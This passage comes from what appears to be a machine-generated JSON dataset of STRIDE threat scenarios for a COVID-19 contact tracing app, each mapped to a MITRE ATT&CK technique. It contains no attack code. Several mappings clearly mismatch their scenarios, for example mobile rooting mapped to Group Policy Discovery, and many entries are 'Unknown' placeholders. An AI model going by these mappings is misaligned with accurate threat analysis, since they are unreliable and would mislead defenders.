                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects user devices, causing application crashes.",
            "Assumptions": [
                {
                    "Assumption": "Application lacks malware protection measures.",
                    "Role": "System",
                    "Condition": "No antivirus or protections"
                },
                {
                    "Assumption": "Device users run the application.",
                    "Role": "User",
                    "Condition": "Active usage"
                },
                {
                    "Assumption": "Malware exploits a vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Known or zero-day vulnerabilities"
                }
            ],
            "Potential Impact": "System instability and disruption in contact tracing functionalities.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "application crash",
                "device"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker leverages phishing to gain access to critical operations.",
            "Assumptions": [
                {
                    "Assumption": "Some users fall for phishing attacks.",
                    "Role": "User",
                    "Condition": "Low awareness levels"
                },
                {
                    "Assumption": "No robust anti-phishing measures.",
                    "Role": "System",
                    "Condition": "Lack of protections"
                },
                {
                    "Assumption": "Critical operations accessible via compromised accounts.",
                    "Role": "System",
                    "Condition": "No segregation of duties"
                }
            ],
            "Potential Impact": "Disruption in operational continuity and potential system outages.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "social engineering",
                "access"
            ],
            "mitre_technique": {
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
                "technique_id": "T1592"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain admin access on the server.",
            "Assumptions": [
                {
                    "Assumption": "Server has an exploitable vulnerability.",
                    "Role": "System",
                    "Condition": "Unpatched vulnerabilities"
                },
                {
                    "Assumption": "Attacker has access to exploitation tools.",
                    "Role": "Attacker",
                    "Condition": "Tool availability"
                },
                {
                    "Assumption": "Weak or default admin credentials.",
                    "Role": "System",
                    "Condition": "No strong credentials"
                }
            ],
            "Potential Impact": "Unauthorized administrative access and control over sensitive operations.",
            "MITRE ATT&CK Keywords": [
                "exploitation",
                "admin access",
                "server"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with lower-level privileges escalates their access permissions.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control policies.",
                    "Role": "System",
                    "Condition": "No strict access controls"
                },
                {
                    "Assumption": "The insider has sufficient technical knowledge.",
                    "Role": "Insider",
                    "Condition": "Technical expertise"
                },
                {
                    "Assumption": "Access controls are not monitored and adjusted.",
                    "Role": "System",
                    "Condition": "Lack of monitoring"
                }
            ],
            "Potential Impact": "Unauthorized access to high-level functionalities and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "insider threat",
                "access control"
            ],
            "mitre_technique": {
                "name": "SID-History Injection",
                "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
                "id": "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d",
                "technique_id": "T1178"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a mobile app vulnerability to obtain higher permissions.",
            "Assumptions": [
                {
                    "Assumption": "Presence of exploitable vulnerabilities in the app.",
                    "Role": "Application",
                    "Condition": "Unpatched weaknesses"
                },
                {
                    "Assumption": "User has technical skills to exploit the vulnerability.",
                    "Role": "User",
                    "Condition": "High technical capability"
                },
                {
                    "Assumption": "Lack of security measures on the device.",
                    "Role": "User",
                    "Condition": "No security software"
                }
            ],
            "Potential Impact": "Gaining unauthorized permissions leading to higher-level malicious activities.",
            "MITRE ATT&CK Keywords": [
                "mobile app",
                "exploitation",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake contact tracing app to steal users' sensitive health data.",
            "Assumptions": [
                {
                    "Assumption": "Users are unaware of the legitimacy of the app.",
                    "Role": "User",
                    "Condition": "When downloading apps from unofficial sources."
                },
                {
                    "Assumption": "The attacker can publish the fake app on unofficial app stores.",
                    "Role": "Attacker",
                    "Condition": "When the app store does not have strict vetting processes."
                },
                {
                    "Assumption": "The fake app mimics the legitimate contact tracing app's appearance.",
                    "Role": "Attacker",
                    "Condition": "When the attacker has access to design assets or can replicate them."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of health data and potential spread of misinformation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "credential harvesting",
                "mobile device"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts Bluetooth communication to impersonate another user's device.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not adequately encrypted.",
                    "Role": "System Architect",
                    "Condition": "When the design does not enforce encryption protocols."
                },
                {
                    "Assumption": "The attacker is within Bluetooth range of the target device.",
                    "Role": "Attacker",
                    "Condition": "During close proximity such as public places."
                },
                {
                    "Assumption": "The attacker has the tools and knowledge to spoof Bluetooth signals.",
                    "Role": "Attacker",
                    "Condition": "When using advanced hacking tools."
                }
            ],
            "Potential Impact": "Corruption of contact tracing data and potential unwarranted exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "bluetooth spoofing",
                "man-in-the-middle",
                "network device spoofing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised email account to send fake COVID-19 exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "The email system's authentication methods can be bypassed or are weak.",
                    "Role": "System Administrator",
                    "Condition": "When using common or default passwords."
                },
                {
                    "Assumption": "Users trust the email addresses and content blindly.",
                    "Role": "User",
                    "Condition": "When not trained to identify phishing emails."
                },
                {
                    "Assumption": "The attacker has access to email accounts or credentials.",
                    "Role": "Attacker",
                    "Condition": "Through previous phishing campaigns or data breaches."
                }
            ],
            "Potential Impact": "Unauthorized exposure notifications leading to unnecessary panic or mistrust in the system.",
            "MITRE ATT&CK Keywords": [
                "email spoofing",
                "phishing",
                "impersonation",
                "social engineering"
            ],
            "mitre_technique": {
                "name": "Email Hiding Rules",
                "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                "id": "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff",
                "technique_id": "T1564.008"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the mobile application to send false exposure data to the server.",
            "Assumptions": [
                {
                    "Assumption": "The mobile application does not have integrity checks.",
                    "Role": "Developer",
                    "Condition": "When deploying the application without integrity validation."
                },
                {
                    "Assumption": "The attacker can decompile and recompile the application.",
                    "Role": "Attacker",
                    "Condition": "Using readily available tools and lack of code obfuscation."
                },
                {
                    "Assumption": "The attacker can distribute the tampered application to users.",
                    "Role": "Attacker",
                    "Condition": "Using unofficial app stores or direct sharing."
                }
            ],
            "Potential Impact": "Corruption of contact tracing data leading to ineffective tracing and false alerts.",
            "MITRE ATT&CK Keywords": [
                "code tampering",
                "data manipulation",
                "mobile app tampering",
                "binary patching"
            ],
            "mitre_technique": {
                "name": "Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931",
                "technique_id": "T1565"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Log files on the server are modified to erase traces of unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Log files are not adequately protected with access controls.",
                    "Role": "System Administrator",
                    "Condition": "When failing to implement proper file permissions."
                },
                {
                    "Assumption": "The attacker has access to the central server.",
                    "Role": "Attacker",
                    "Condition": "Through vulnerabilities or compromised credentials."
                },
                {
                    "Assumption": "The application does not implement log integrity checks.",
                    "Role": "Developer",
                    "Condition": "When designing the logging mechanism."
                }
            ],
            "Potential Impact": "Tampered logs can hide unauthorized access, compromising audit trails.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "audit trail tampering",
                "file system tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies Bluetooth data before it is processed by the application.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth data is transmitted in an unencrypted or tamperable format.",
                    "Role": "System Architect",
                    "Condition": "When failing to encrypt Bluetooth communications."
                },
                {
                    "Assumption": "The attacker is within the range of Bluetooth communications.",
                    "Role": "Attacker",
                    "Condition": "During close physical proximity."
                },
                {
                    "Assumption": "The application does not verify the integrity of received data.",
                    "Role": "Developer",
                    "Condition": "When failing to implement data validation checks."
                }
            ],
            "Potential Impact": "Corruption of proximity data leading to inaccurate contact tracing.",
            "MITRE ATT&CK Keywords": [
                "network data manipulation",
                "bluetooth interception",
                "data tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--0c7cf12a-4667-4e15-8102-e4ccd4c7c1c0",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having received a COVID-19 exposure notification.",
            "Assumptions": [
                {
                    "Assumption": "Notifications are not logged with user confirmations.",
                    "Role": "Developer",
                    "Condition": "When designing the notification system without logging."
                },
                {
                    "Assumption": "The system does not have an auditing mechanism.",
                    "Role": "System Architect",
                    "Condition": "When failing to implement comprehensive logging."
                },
                {
                    "Assumption": "The user has a reason to dispute the exposure notification.",
                    "Role": "User",
                    "Condition": "Due to personal or legal implications."
                }
            ],
            "Potential Impact": "Reducing trust in the app\u2019s efficacy and complicating contact tracing efforts.",
            "MITRE ATT&CK Keywords": [
                "data repudiation",
                "log omission",
                "non-repudiation failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies modifying the contact tracing app on their device.",
            "Assumptions": [
                {
                    "Assumption": "The system does not track application version and integrity.",
                    "Role": "Developer",
                    "Condition": "When failing to implement version control checks."
                },
                {
                    "Assumption": "User devices do not report app integrity status.",
                    "Role": "Developer",
                    "Condition": "When failing to send integrity reports to the server."
                }
            ],
            "Potential Impact": "Inability to enforce application policies and ensure data integrity.",
            "MITRE ATT&CK Keywords": [
                "application repudiation",
                "application tampering",
                "version control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A healthcare provider denies sending data to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data transactions are not logged with sufficient detail.",
                    "Role": "System Architect",
                    "Condition": "When designing the data transmission mechanism."
                },
                {
                    "Assumption": "The server does not maintain audit trails of data receipts.",
                    "Role": "System Administrator",
                    "Condition": "When lacking a robust logging mechanism."
                },
                {
                    "Assumption": "Stakeholder agreements do not include data sharing accountability.",
                    "Role": "Healthcare Provider",
                    "Condition": "When establishing data agreements without clear terms."
                }
            ],
            "Potential Impact": "Challenges in tracing the source of data contributions, affecting system accountability.",
            "MITRE ATT&CK Keywords": [
                "data repudiation",
                "audit trail",
                "transaction logging"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted Bluetooth signals to gather proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not adequately encrypted.",
                    "Role": "System Architect",
                    "Condition": "When failing to enforce encryption protocols."
                },
                {
                    "Assumption": "The attacker is within Bluetooth range of the target device.",
                    "Role": "Attacker",
                    "Condition": "During close proximity such as public places."
                },
                {
                    "Assumption": "The attacker has the tools and knowledge to intercept Bluetooth signals.",
                    "Role": "Attacker",
                    "Condition": "Using readily available tools."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of health data and potential tracking of individuals\u2019 movements.",
            "MITRE ATT&CK Keywords": [
                "bluetooth sniffing",
                "data interception",
                "network listening"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A data breach occurs on the central server, exposing users\u2019 health data.",
            "Assumptions": [
                {
                    "Assumption": "The central server is not adequately protected with security controls.",
                    "Role": "System Administrator",
                    "Condition": "When lacking robust security measures."
                },
                {
                    "Assumption": "The attacker gains access to the central server.",
                    "Role": "Attacker",
                    "Condition": "Through common vulnerabilities such as unpatched software."
                },
                {
                    "Assumption": "Sensitive health data is stored without encryption.",
                    "Role": "System Architect",
                    "Condition": "When failing to implement encryption mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user health data and privacy violations.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "server compromise",
                "health data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a logging vulnerability to access sensitive contact tracing metadata.",
            "Assumptions": [
                {
                    "Assumption": "Log files store sensitive metadata without encryption.",
                    "Role": "Developer",
                    "Condition": "When implementing logging mechanisms."
                },
                {
                    "Assumption": "The attacker knows the location and format of log files.",
                    "Role": "Attacker",
                    "Condition": "Through prior reconnaissance or insider knowledge."
                },
                {
                    "Assumption": "The logging system does not have strict access controls.",
                    "Role": "System Administrator",
                    "Condition": "When failing to enforce file permissions."
                }
            ],
            "Potential Impact": "Unauthorized access to metadata leading to privacy violations.",
            "MITRE ATT&CK Keywords": [
                "log file access",
                "metadata exposure",
                "data vulnerability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the central server to disrupt contact tracing operations.",
            "Assumptions": [
                {
                    "Assumption": "The central server is exposed to the internet without adequate protections.",
                    "Role": "System Architect",
                    "Condition": "When failing to implement DDoS protection mechanisms."
                },
                {
                    "Assumption": "The attacker has the capability to generate sufficient traffic.",
                    "Role": "Attacker",
                    "Condition": "Using botnets or amplification techniques."
                },
                {
                    "Assumption": "The server\u2019s capacity is not sufficient to handle large traffic volumes.",
                    "Role": "System Architect",
                    "Condition": "When not designed for scalability."
                }
            ],
            "Potential Impact": "Disruption of contact tracing activities and delays in exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "ddos",
                "service disruption",
                "network flood"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the mobile app to crash it on user devices.",
            "Assumptions": [
                {
                    "Assumption": "The mobile app has unpatched vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "When not updating the app with security patches."
                },
                {
                    "Assumption": "The attacker can distribute malicious data or trigger the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Through user interactions or network traffic."
                },
                {
                    "Assumption": "The mobile app does not have mechanisms to handle unexpected data gracefully.",
                    "Role": "Developer",
                    "Condition": "When failing to implement robust error handling."
                }
            ],
            "Potential Impact": "Disruption of contact tracing services on user devices and potential loss of data.",
            "MITRE ATT&CK Keywords": [
                "application crash",
                "vulnerability exploitation",
                "mobile app dos"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the service server with invalid key upload requests, overwhelming it.",
            "Assumptions": [
                {
                    "Assumption": "The service server does not have rate limiting in place.",
                    "Role": "System Architect",
                    "Condition": "When designing the server endpoints without rate limiting."
                },
                {
                    "Assumption": "The attacker knows the endpoints for key uploads.",
                    "Role": "Attacker",
                    "Condition": "Through reconnaissance or insider knowledge."
                },
                {
                    "Assumption": "The server cannot distinguish between valid and invalid requests efficiently.",
                    "Role": "Developer",
                    "Condition": "When lacking request validation mechanisms."
                }
            ],
            "Potential Impact": "Overwhelm the server, leading to service disruption and delayed key processing.",
            "MITRE ATT&CK Keywords": [
                "api flood",
                "service server overload",
                "rate limiting bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains root access on a user's device by exploiting a vulnerability in the mobile app.",
            "Assumptions": [
                {
                    "Assumption": "The mobile app has unpatched root privilege escalation vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "When not updating the app with security patches."
                },
                {
                    "Assumption": "The attacker can trigger the vulnerability through app interactions.",
                    "Role": "Attacker",
                    "Condition": "Using crafted inputs or exploiting functionality."
                },
                {
                    "Assumption": "The operating system does not have sufficient protections against privilege escalation.",
                    "Role": "System Architect",
                    "Condition": "When relying solely on app-level security."
                }
            ],
            "Potential Impact": "Full control of the device, unauthorized access to sensitive data, and potential further attacks.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "rooting",
                "mobile exploitation"
            ],
            "mitre_technique": {
                "name": "Group Policy Discovery",
                "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
                "id": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b",
                "technique_id": "T1615"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on the central server by exploiting a misconfiguration or vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "There are misconfigurations or unpatched vulnerabilities on the server.",
                    "Role": "System Administrator",
                    "Condition": "When failing to apply security best practices."
                },
                {
                    "Assumption": "The attacker has initial access to the server.",
                    "Role": "Attacker",
                    "Condition": "Through compromised credentials or initial exploits."
                },
                {
                    "Assumption": "The server does not have sufficient monitoring and alerting.",
                    "Role": "System Architect",
                    "Condition": "When lacking security monitoring tools."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and critical systems, leading to broader compromises.",
            "MITRE ATT&CK Keywords": [
                "server privilege escalation",
                "misconfiguration exploitation",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Compromise Software Supply Chain",
                "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",
